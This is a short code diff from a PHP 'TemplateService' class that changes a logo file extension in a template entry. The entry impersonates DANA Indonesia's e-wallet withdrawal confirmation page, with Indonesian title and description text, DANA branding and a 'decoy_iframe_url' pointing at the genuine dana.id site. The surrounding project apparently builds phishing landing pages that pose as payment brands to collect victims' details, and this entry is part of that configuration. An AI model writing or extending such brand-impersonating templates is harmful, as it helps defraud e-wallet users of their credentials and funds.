@@ -72,7 +72,7 @@ class TemplateService
                 'title' => 'Konfirmasi Penarikan Saldo Dompet Digital - DANA Indonesia',
                 'preview_description' => 'Periksa dan konfirmasi detail penarikan saldo e-wallet Anda sebelum pencairan ke rekening tujuan.',
                 'heading' => 'Konfirmasi Penarikan Saldo',
-                'og_image' => 'images/landing/dana-logo.png',
+                'og_image' => 'images/landing/dana-logo.jpg',
                 'decoy_iframe_url' => 'https://www.dana.id/',
                 'icon' => 'fa-wallet',
                 'color' => 'from-emerald-500 to-teal-600',
